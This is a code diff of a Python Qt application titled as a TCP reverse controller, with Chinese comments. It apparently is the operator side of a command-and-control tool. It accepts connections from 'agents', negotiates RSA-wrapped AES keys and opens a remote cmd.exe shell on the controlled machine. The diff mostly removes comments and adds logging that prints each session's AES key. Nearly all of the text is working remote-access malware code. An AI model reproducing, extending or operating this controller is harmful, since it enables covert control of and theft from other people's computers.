@@ -30,17 +30,11 @@ class ClientSession:
         self.connected = True
         self._recv_buf = bytearray()
         self.signals = ClientSignals()
-
-        # 握手相关
         self.handshake_done = False
         self.aes_key: bytes | None = None
         self.rsa_private = rsa_priv
 
-        # =========方案A：不再发送公钥，agent连上后主动发送RSA密文========
-        pass
-
     def _encrypt_packet(self, plain_data: bytes) -> bytes:
-        """明文 → IV(16)+AES‑CFB密文"""
         iv = os_rand.urandom(16)
         cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
         enc = cipher.encryptor()
@@ -48,7 +42,6 @@ class ClientSession:
         return iv + ciphertext
 
     def _decrypt_packet(self, iv_cipher: bytes) -> bytes:
-        """iv(16) + cipher → 明文"""
         iv = iv_cipher[:16]
         ciphertext = iv_cipher[16:]
         cipher = Cipher(algorithms.AES(self.aes_key), modes.CFB(iv))
@@ -92,19 +85,16 @@ class RemoteCmdDialog(QDialog):
         self.resize(680, 450)
         self.client = client_session
         self.is_alive = True
-
         lay = QVBoxLayout(self)
         self.out_box = QTextEdit()
         self.out_box.setReadOnly(True)
         lay.addWidget(self.out_box)
-
         input_lay = QHBoxLayout()
         self.cmd_input = QLineEdit()
         self.cmd_input.setPlaceholderText("输入命令回车执行")
         self.cmd_input.returnPressed.connect(self.on_enter_command)
         input_lay.addWidget(self.cmd_input)
         lay.addLayout(input_lay)
-
         self.out_box.append(f"==== 连接 {self.client.ip_str} 远程 CMD ====\n [*] 已发送 SPAW 启动被控端 cmd.exe")
         self.client.send_packet(b"SPAW")
 
@@ -164,18 +154,15 @@ class MainWindow(QMainWindow):
     def __init__(self, rsa_key):
         super().__init__()
         self.rsa_private_key = rsa_key
-
         self.setWindowTitle("TCP 反向控制端")
         self.resize(700, 500)
         self.server_sock: socket.socket | None = None
         self.server_running = False
         self.client_model = ClientListModel()
         self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}
-
         w = QWidget()
         self.setCentralWidget(w)
         lay = QVBoxLayout(w)
-
         top_lay = QHBoxLayout()
         top_lay.addWidget(QLabel("监听端口:"))
         self.port_edit = QLineEdit("8888")
@@ -188,14 +175,12 @@ class MainWindow(QMainWindow):
         self.btn_stop.setEnabled(False)
         top_lay.addWidget(self.btn_stop)
         lay.addLayout(top_lay)
-
         self.view = QListView()
         self.view.setModel(self.client_model)
         self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
         self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
         self.view.customContextMenuRequested.connect(self.on_context_menu)
         lay.addWidget(self.view)
-
         self.log_box = QTextEdit()
         self.log_box.setReadOnly(True)
         lay.addWidget(self.log_box)
@@ -207,7 +192,6 @@ class MainWindow(QMainWindow):
         while self.server_running:
             try:
                 conn, addr = self.server_sock.accept()
-                # 不再传pub_blob
                 sess = ClientSession(conn, addr, self.rsa_private_key)
                 sess.signals.on_outp.connect(self.handle_session_outp)
                 sess.signals.on_disconnect.connect(self.handle_session_disconnect)
@@ -240,19 +224,17 @@ class MainWindow(QMainWindow):
                 if not chunk:
                     break
                 buf.extend(chunk)
-
                 while len(buf) >= 4:
                     body_len = struct.unpack(">I", buf[0:4])[0]
                     total_packet_len = 4 + body_len
                     if len(buf) < total_packet_len:
                         break
-
                     body = bytes(buf[4:total_packet_len])
                     del buf[:total_packet_len]
 
-                    # -------- 握手阶段：agent上来直接发送256字节RSA密文 --------
                     if not sess.handshake_done:
                         if body_len == 256:
+                            self.log(f"[{sess.ip_str}] DEBUG: body_len={body_len}")
                             try:
                                 aes16 = sess.rsa_private.decrypt(
                                     body,
@@ -264,7 +246,7 @@ class MainWindow(QMainWindow):
                                 )
                                 sess.aes_key = aes16
                                 sess.handshake_done = True
-                                self.log(f"[{sess.ip_str}] ✅握手完成，获得AES密钥")
+                                self.log(f"[{sess.ip_str}] ✅握手完成，获得AES密钥 aes={aes16.hex()}")
                                 self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                             except Exception as e:
                                 self.log(f"[{sess.ip_str}] ❌RSA解密失败:{repr(e)}")
@@ -274,12 +256,10 @@ class MainWindow(QMainWindow):
                             sess.close()
                         continue
 
-                    # -------- 握手完成：body = iv_cipher + hmac(32) --------
                     if body_len < (16 + 32):
                         self.log(f"[{sess.ip_str}] 加密包长度过短 {body_len}")
                         sess.close()
                         continue
-
                     iv_cipher_part = body[:-32]
                     recv_hmac = body[-32:]
                     calc_h = sess._calc_hmac(iv_cipher_part)
@@ -287,15 +267,12 @@ class MainWindow(QMainWindow):
                         self.log(f"[{sess.ip_str}] ❌HMAC校验失败，数据包被篡改")
                         sess.close()
                         continue
-
                     try:
                         plain_body = sess._decrypt_packet(iv_cipher_part)
                     except Exception as e:
                         self.log(f"[{sess.ip_str}] AES解密异常 {repr(e)}")
                         sess.close()
                         continue
-
-                    # 解析明文命令
                     if len(plain_body)>=4:
                         cmd_code = plain_body[0:4]
                         if cmd_code == b"PONG":
@@ -305,7 +282,6 @@ class MainWindow(QMainWindow):
                             output_bytes = plain_body[4:]
                             out_text = output_bytes.decode("gbk", errors="replace")
                             sess.signals.on_outp.emit(sess, out_text)
-
             except OSError:
                 break
         sess.close()
@@ -368,15 +344,12 @@ def main():
         exe_dir = os.path.dirname(sys.executable)
     else:
         exe_dir = os.path.dirname(os.path.abspath(__file__))
-
-    # =========方案A：不再读取 c2_public.key，只读取私钥=========
     pem_path = os.path.join(exe_dir, "private.pem")
     with open(pem_path, "rb") as f:
         rsa_private_key = serialization.load_pem_private_key(
             f.read(),
             password=None
         )
-
     app = QApplication(sys.argv)
     win = MainWindow(rsa_private_key)
     win.show()
